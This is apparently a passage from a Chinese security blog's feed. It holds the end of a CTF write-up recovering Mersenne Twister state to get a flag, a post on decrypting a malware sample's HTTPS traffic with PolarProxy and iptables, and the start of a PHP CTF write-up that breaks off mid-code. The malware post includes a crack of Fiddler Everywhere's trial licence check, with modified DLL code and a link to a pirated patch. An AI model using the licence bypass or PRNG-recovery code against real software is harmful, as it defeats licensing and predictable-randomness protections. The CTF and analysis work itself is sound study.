mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p><p>编写脚本验证想法</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">equ = [</span><br><span class="line">[<span class="number">0</span>, <span class="number">11</span>, <span class="number">15</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">12</span>, <span class="number">16</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">13</span>, <span class="number">17</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">14</span>, <span class="number">18</span>],</span><br><span class="line">[<span class="number">4</span>, <span class="number">15</span>, <span class="number">19</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">16</span>, <span class="number">20</span>],</span><br><span class="line">[<span class="number">6</span>, <span class="number">17</span>, <span class="number">21</span>],</span><br><span class="line">[<span class="number">7</span>, <span class="number">18</span>, <span class="number">22</span>],</span><br><span class="line">[<span class="number">8</span>, <span class="number">19</span>, <span class="number">23</span>],</span><br><span class="line">[<span class="number">9</span>, <span class="number">20</span>, <span class="number">24</span>],</span><br><span class="line">[<span class="number">10</span>, <span class="number">21</span>, <span class="number">25</span>],</span><br><span class="line">[<span class="number">11</span>, <span class="number">22</span>, <span class="number">26</span>],</span><br><span class="line">[<span class="number">12</span>, <span class="number">23</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">13</span>, <span class="number">24</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">14</span>, <span class="number">25</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">15</span>, <span class="number">26</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">16</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">17</span>, <span class="number">28</span>, <span class="number">0</span>],</span><br><span class="line">[<span class="number">18</span>, <span class="number">29</span>, <span class="number">1</span>],</span><br><span class="line">[<span class="number">19</span>, <span class="number">30</span>, <span class="number">2</span>],</span><br><span class="line">[<span class="number">20</span>, <span class="number">31</span>, <span class="number">3</span>],</span><br><span class="line">[<span class="number">21</span>, <span class="number">0</span>, <span class="number">4</span>],</span><br><span class="line">[<span class="number">22</span>, <span class="number">1</span>, <span class="number">5</span>],</span><br><span class="line">[<span class="number">23</span>, <span class="number">2</span>, <span class="number">6</span>],</span><br><span class="line">[<span class="number">24</span>, <span class="number">3</span>, <span class="number">7</span>],</span><br><span class="line">[<span class="number">25</span>, <span class="number">4</span>, <span class="number">8</span>],</span><br><span class="line">[<span class="number">26</span>, <span class="number">5</span>, <span class="number">9</span>],</span><br><span class="line">[<span class="number">27</span>, <span class="number">6</span>, <span class="number">10</span>],</span><br><span class="line">[<span class="number">28</span>, <span class="number">7</span>, <span class="number">11</span>],</span><br><span class="line">[<span class="number">29</span>, <span class="number">8</span>, <span class="number">12</span>],</span><br><span class="line">[<span class="number">30</span>, <span class="number">9</span>, <span class="number">13</span>],</span><br><span class="line">[<span class="number">31</span>, <span class="number">10</span>, <span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">self_xor</span>(<span class="params">number1, number2</span>):</span></span><br><span class="line">new_equ = []</span><br><span class="line">length = <span class="built_in">len</span>(equ)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">equ1 = [x <span class="keyword">for</span> x <span class="keyword">in</span> equ[_]]</span><br><span class="line">equ2 = [x <span class="keyword">for</span> x <span class="keyword">in</span> equ[(_ + number1)%length]]</span><br><span class="line">equ3 = [x <span class="keyword">for</span> x <span class="keyword">in</span> equ[(_ + number2)%length]]</span><br><span class="line"><span class="keyword">for</span> __ <span class="keyword">in</span> equ2:</span><br><span class="line"><span class="keyword">if</span> __ <span class="keyword">in</span> equ1:</span><br><span class="line">equ1.pop(equ1.index(__))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">equ1.append(__)</span><br><span class="line"><span class="keyword">for</span> __ <span class="keyword">in</span> equ3:</span><br><span class="line"><span class="keyword">if</span> __ <span class="keyword">in</span> equ1:</span><br><span class="line">equ1.pop(equ1.index(__))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">equ1.append(__)</span><br><span class="line">new_equ.append(equ1)</span><br><span class="line"><span class="keyword">return</span> new_equ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">equ = self_xor(<span class="number">25</span>, <span class="number">13</span>)</span><br><span class="line">equ = self_xor(<span class="number">18</span>, <span class="number">26</span>)</span><br><span class="line">equ = self_xor(<span class="number">4</span>, <span class="number">20</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> equ:</span><br><span class="line">print(_)</span><br></pre></td></tr></table></figure><p>最后的输出结果可以验证想法正确，且获得了迭代异或运算的<code>shitf</code>值<br />第二条语句的逆向算法同理</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits_xor</span>(<span class="params">bits, shift1, shift2</span>):</span></span><br><span class="line">old_bits = bits</span><br><span class="line">length = <span class="built_in">len</span>(bits)</span><br><span class="line">new_bits = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">new_bits = new_bits + <span class="built_in">str</span>(<span class="built_in">int</span>(old_bits[_]) ^ <span class="built_in">int</span>(old_bits[(_+shift1)%length]) ^ <span class="built_in">int</span>(old_bits[(_+shift2)%length]))</span><br><span class="line"><span class="keyword">return</span> new_bits</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cs2l</span>(<span class="params">y, shift</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((y &lt;&lt; shift) ^ (y &gt;&gt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cs2r</span>(<span class="params">y, shift</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((y &gt;&gt; shift) ^ (y &lt;&lt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_cs2l</span>(<span class="params">y</span>):</span></span><br><span class="line">bits = <span class="built_in">bin</span>(y)[<span class="number">2</span>:]</span><br><span class="line">bit_len = <span class="built_in">len</span>(bits)</span><br><span class="line">bits32 = <span class="string">&quot;0&quot;</span> * (<span class="number">32</span> - bit_len) + bits</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">11</span>, <span class="number">15</span>)</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">22</span>, <span class="number">30</span>)</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">12</span>, <span class="number">28</span>)</span><br><span class="line">number = <span class="built_in">int</span>(bits32, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> number</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_cs2r</span>(<span class="params">y</span>):</span></span><br><span class="line">bits = <span class="built_in">bin</span>(y)[<span class="number">2</span>:]</span><br><span class="line">bit_len = <span class="built_in">len</span>(bits)</span><br><span class="line">bits32 = <span class="string">&quot;0&quot;</span> * (<span class="number">32</span> - bit_len) + bits</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">25</span>, <span class="number">13</span>)</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">18</span>, <span class="number">26</span>)</span><br><span class="line">bits32 = bits_xor(bits32, <span class="number">4</span>, <span class="number">20</span>)</span><br><span class="line">number = <span class="built_in">int</span>(bits32, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">return</span> number</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./output.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.read().split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">f.close()</span><br><span class="line">MT = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> data:</span><br><span class="line">MT.append(reverse_cs2l(reverse_cs2r(<span class="built_in">int</span>(_))))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">624</span>):</span><br><span class="line">y = (MT[i] &amp; <span class="number">0x80000000</span>) + (MT[(i+<span class="number">1</span>)%<span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">MT[i] = MT[(i+<span class="number">397</span>)%<span class="number">624</span>] ^ (y &gt;&gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> y &amp; <span class="number">1</span>:</span><br><span class="line">MT[i] ^= <span class="number">2567483520</span></span><br><span class="line"></span><br><span class="line">y = MT[<span class="number">0</span>]</span><br><span class="line">y = y ^ cs2l(y, <span class="number">11</span>) ^ cs2l(y, <span class="number">15</span>)</span><br><span class="line">y = y ^ cs2r(y, <span class="number">7</span>) ^ cs2r(y, <span class="number">19</span>)</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">flag = <span class="string">&#x27;DASCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(y).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;49e225e5b1b57a1d3c9803b5ddfd38f9&#125;</span><br></pre></td></tr></table></figure><hr /><p>后面两题随缘更新</p><hr /><p>更个锤子，Crypto2 3想破头都没思路</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;老样子，赛后解题&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="https://yoloyolo.top/tags/Crypto/"/>
    
    <category term="MT19937" scheme="https://yoloyolo.top/tags/MT19937/"/>
    
  </entry>
  
  <entry>
    <title>恶意程序HTTPS解密</title>
    <link href="https://yoloyolo.top/2022/05/14/Malware-HTTPS-Decryption/"/>
    <id>https://yoloyolo.top/2022/05/14/Malware-HTTPS-Decryption/</id>
    <published>2022-05-14T11:54:29.000Z</published>
    <updated>2022-06-10T17:44:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>距离省考宣布寄了已经过去了两个月了<br />于是打了两个月的游戏，属实是打吐了<br />出来去原来的单位实习<br />上来就是分析病毒<br />在摸索的过程中产生了这篇文章</p><a id="more"></a><h1 id="0x00-wireshark"><a class="markdownIt-Anchor" href="#0x00-wireshark"></a> 0x00 Wireshark</h1><p>尝试抓包恶意软件</p><p>开启Wireshark，运行恶意程序，全是HTTPS的数据</p><p>看了下网上的资料可以设置环境变量<code>$SSLKEYLOGFILE</code>来设置SSL密钥临时文件的位置，然后在Wireshark里导入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SSLKEYLOGFILE=/tmp/tls.log</span><br></pre></td></tr></table></figure><p>Edit→ Preferences → Protocols → TLS → (Pre-)Master-Secret log filename</p><p>选择环境变量<code>$SSLKEYLOGFILE</code>的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://www.baidu.com/</span><br></pre></td></tr></table></figure><p>即可<code>$SSLKEYLOGFILE</code>中看到HTTPS的密钥</p><p>Wireshark中也可以看到解密的HTTPS流量</p><p>但是运行恶意程序，恶意程序发起的HTTPS请求后并不会在<code>$SSLKEYLOGFILE</code>写入密钥</p><p>所以这个方法行不通</p><p>有想到过自己看TLS的密钥协商过程，写个脚本来计算出<strong>Master Secret Key</strong>，然后导入Wireshark来解密已保存的流量，但水平有限写不出来</p><p>好吧，正常情况</p><hr /><h1 id="0x01-burpsuite"><a class="markdownIt-Anchor" href="#0x01-burpsuite"></a> 0x01 Burpsuite</h1><p>将Burpsuite证书设置为系统证书（与<a href="https://yoloyolo.top/2021/08/01/Summary-For-Android-APP-Test/#%E7%94%A8%E6%88%B7%E8%AF%81%E4%B9%A6%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%AF%81%E4%B9%A6">这篇文章</a>类似）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">burpsuite&amp;</span><br><span class="line">curl -O http://127.0.0.1:8080/cert</span><br><span class="line">openssl x509 -inform DER -<span class="keyword">in</span> cert -out burp.crt</span><br><span class="line">mv burp.crt /usr/<span class="built_in">local</span>/share/ca-certificates/</span><br><span class="line">update-ca-certificates</span><br></pre></td></tr></table></figure><p>设置系统代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://127.0.0.1:8080/&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://127.0.0.1:8080/&quot;</span></span><br></pre></td></tr></table></figure><p>命令行里的curl和python都能被抓到https的数据包</p><p>但是恶意软件的流量抓不到</p><p>使用proxychains代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install proxychains</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;http 127.0.0.1 8080&quot;</span> &gt;&gt; /etc/proxychains.conf</span><br><span class="line">proxychain ./fritzfrog</span><br></pre></td></tr></table></figure><p>(配置文件<code>/etc/proxychains.conf</code>好像默认有一个socks4的代理？自己看着删掉吧)</p><p>但是恶意软件的流量还是抓不到</p><p>大概是这个恶意程序设置的是不走系统的代理吧，只能说开发人员有点水平</p><hr /><h1 id="0x02-fiddler-everywhere"><a class="markdownIt-Anchor" href="#0x02-fiddler-everywhere"></a> 0x02 Fiddler Everywhere</h1><p>想着在Fiddler上抓一下全局流量，结果Fiddler4在linux上面用不了，只能用mono运行一个老版本</p><p>还是用Fidder Everywhere吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://downloads.getfiddler.com/linux/fiddler-everywhere-3.2.0.AppImage</span><br><span class="line">chmod +x fiddler-everywhere-3.2.0.AppImage</span><br><span class="line">./fiddler-everywhere-3.2.0.AppImage</span><br></pre></td></tr></table></figure><p>注册，登录，“Your 30-day free trial has expired!”</p><p>看来是得破解一下了</p><p><a href="https://www.jianshu.com/p/5ce61cbae73a">AppImage格式操作说明</a></p><p>网上逛逛找到了个补丁</p><p><a href="https://leakforums.su/threads/fiddler-everywhere-3-2-0-cracked.138919/#post-311448">补丁下载</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fiddler-everywhere-3.2.0.AppImage --appimage-extract</span><br></pre></td></tr></table></figure><p><code>Fiddler.WebUi.dll</code>在<code>./squashfs-root/resources/app/out/WebServer/</code></p><p><code>main.3f983221e4e1aade.js</code>在<code>./squashfs-root/resources/app/out/WebServer/ClientApp/dist/</code></p><p>替换完成后进行打包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/AppImage/AppImageKit/releases/download/13/appimagetool-x86_64.AppImage</span><br><span class="line">mv appimagetool-x86_64.AppImage appimagetool</span><br><span class="line">chmod +x appiamgetool</span><br><span class="line">mv appimagetool /usr/<span class="built_in">local</span>/bin/</span><br><span class="line">ARCH=x86_64 appimagetool squashfs-root/</span><br><span class="line">./Fiddler_Everywhere-x86_64.AppImage</span><br></pre></td></tr></table></figure><p>卡在&quot;Please Wait&quot;界面，寄</p><p>根据这篇博客<a href="https://www.jysafe.cn/4785.air">[Linux]破解抓包软件FiddlerEverywhere 3.2.0 cracked</a>用dnspy改FiddlerBackendSDK.dll文件</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//raw</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AccountDTO <span class="title">GetBestAccount</span>(<span class="params">UserWithBestAccountDTO user</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (user.BestEverywhereAccountId != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> Enumerable.FirstOrDefault&lt;UserAccountDTO&gt;(user.Accounts, (UserAccountDTO x) =&gt; x.Id == user.BestEverywhereAccountId.Value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//modified</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AccountDTO <span class="title">GetBestAccount</span>(<span class="params">UserWithBestAccountDTO user</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> Enumerable.FirstOrDefault&lt;UserAccountDTO&gt;(user.Accounts, (UserAccountDTO x) =&gt; <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改成这样重打包dll，替换原dll后重打包appimage</p><p>运行后还是卡在&quot;Please Wait&quot;界面，寄</p><p>浪费了大半天的时间<del>混了大半天</del></p><hr /><h1 id="0x03-polarproxy"><a class="markdownIt-Anchor" href="#0x03-polarproxy"></a> 0x03 Polarproxy</h1><p>之前想着恶意程序既然能够绕过系统代理，那我把网卡的流量用iptables整个重定向到Burpsuite不就行了</p><p>但是实际上还是不行，自己大概思考了一下，这玩意估计把TCP握手的流量也丢给Burpsuite了，Burpsuite估计是处理不了TCP流量，然后就寄了（未验证）</p><p>混了大半天，突然脑子有个想法，google上搜了一下&quot;how to decrypt malware https traffic&quot;</p><p>然后第一个结果就介绍了PolarProxy这个工具，去官网看了一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PolarProxy is a transparent SSL&#x2F;TLS proxy created for incident responders and malware researchers. PolarProxy is primarily designed to intercept and decrypt TLS encrypted traffic from malware. PolarProxy decrypts and re-encrypts TLS traffic, while also saving the decrypted traffic in a PCAP file that can be loaded into Wireshark or an intrusion detection system (IDS).</span><br></pre></td></tr></table></figure><p>看来自己是找对东西了</p><p>这玩意得单独用个用户运行，不然到时候iptables重定向会跟这玩意整个死循环出来</p><p>安装并启用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser --system --shell /bin/bash proxyuser</span><br><span class="line">sudo mkdir /var/<span class="built_in">log</span>/PolarProxy</span><br><span class="line">sudo chown proxyuser:root /var/<span class="built_in">log</span>/PolarProxy/</span><br><span class="line">sudo chmod 0775 /var/<span class="built_in">log</span>/PolarProxy/</span><br><span class="line">sudo su - proxyuser</span><br><span class="line">mkdir ~/PolarProxy</span><br><span class="line"><span class="built_in">cd</span> ~/PolarProxy/</span><br><span class="line">curl https://www.netresec.com/?download=PolarProxy | tar -xzf -</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">sudo cp /home/proxyuser/PolarProxy/PolarProxy.service /etc/systemd/system/PolarProxy.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> PolarProxy.service</span><br><span class="line">sudo systemctl start PolarProxy.service</span><br></pre></td></tr></table></figure><p>配置系统证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /usr/share/ca-certificates/extra</span><br><span class="line">sudo openssl x509 -inform DER -<span class="keyword">in</span> /var/<span class="built_in">log</span>/PolarProxy/polarproxy.cer -out /usr/share/ca-certificates/extra/PolarProxy-root-CA.crt</span><br><span class="line">sudo dpkg-reconfigure ca-certificates</span><br></pre></td></tr></table></figure><p>启用<code>extra /PolarProxy-root-CA.crt</code>即可</p><p>配置iptables</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A OUTPUT -m owner --uid 0 -p tcp --dport 443 -j REDIRECT --to 10443</span><br><span class="line">iptables -t nat -A OUTPUT -m owner --uid 1000 -p tcp --dport 443 -j REDIRECT --to 10443</span><br></pre></td></tr></table></figure><p>运行恶意程序后在目录<code>/var/log/PolarProxy/</code>中可以看到程序捕获并解密的HTTPS流量</p><p>使用wireshark打开即可</p><p>普通用户运行恶意程序没啥反应，用root运行才抓到包</p><p>顺带一提，这个程序默认每天解密10GB的HTTPS的流量或10000次SESSION，但是够用了</p><hr /><h1 id="0x04-ecapture"><a class="markdownIt-Anchor" href="#0x04-ecapture"></a> 0x04 ecapture</h1><p><a href="https://github.com/ehids/ecapture">https://github.com/ehids/ecapture</a></p><p>看ebpf rootkit的时候看到了一个基于ebpf的monitor</p><p>能检测bash和解密https</p><p>解密的大概思路是hook一些ssl库，对于tls层可以直接获取http请求与响应</p><p>也就意味着这玩意甚至能免除用于MITM的CA</p><p>但是缺点也很明显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldd .&#x2F;apache2</span><br><span class="line"> not a dynamic executable</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;距离省考宣布寄了已经过去了两个月了&lt;br /&gt;
于是打了两个月的游戏，属实是打吐了&lt;br /&gt;
出来去原来的单位实习&lt;br /&gt;
上来就是分析病毒&lt;br /&gt;
在摸索的过程中产生了这篇文章&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Malware" scheme="https://yoloyolo.top/tags/Malware/"/>
    
    <category term="Reverse" scheme="https://yoloyolo.top/tags/Reverse/"/>
    
    <category term="HTTPS" scheme="https://yoloyolo.top/tags/HTTPS/"/>
    
    <category term="Traffic_Analysis" scheme="https://yoloyolo.top/tags/Traffic-Analysis/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF_APR_2022</title>
    <link href="https://yoloyolo.top/2022/04/24/DASCTF-APR-2022/"/>
    <id>https://yoloyolo.top/2022/04/24/DASCTF-APR-2022/</id>
    <published>2022-04-23T17:52:50.000Z</published>
    <updated>2022-04-25T08:01:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>本来恰完KFC晚餐准备回寝室打游戏来着，路上被队友喊去做WEB了<br />说是今天BUUOJ上的比赛，但是已经打完了，做两题玩玩<br />但是我上一次碰CTF还是去年的省赛…</p><a id="more"></a><h1 id="warmup-php"><a class="markdownIt-Anchor" href="#warmup-php"></a> warmup-php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line"><span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line"><span class="variable">$object</span>-&gt;run();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Action(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参数<code>action</code>用于输入类名<br />参数<code>properties</code>用于输入对象的属性<br />完事后会执行<code>$object-&gt;run()</code><br />函数<code>run()</code>在<code>ListView.php</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 